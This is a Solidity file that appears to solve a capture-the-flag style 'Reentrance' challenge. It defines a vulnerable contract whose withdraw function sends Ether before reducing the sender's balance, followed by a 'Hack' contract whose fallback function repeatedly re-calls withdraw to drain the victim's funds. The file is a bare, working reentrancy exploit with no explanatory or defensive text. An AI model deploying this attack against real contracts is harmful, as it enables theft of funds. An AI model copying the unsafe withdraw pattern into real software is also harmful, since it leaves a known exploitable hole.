pragma solidity ^0.6.12;
contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Hack{
    
    Reentrance reentrance;
    
    constructor(address payable _reentrance)public{
        reentrance = Reentrance(_reentrance);
    }
    
    fallback() external payable{
        if (address(reentrance).balance >= 1 ether ){
            reentrance.withdraw(1 ether);
        }
    }
    function hack()public payable{
        require(msg.value >= 1 ether);
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }
        function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}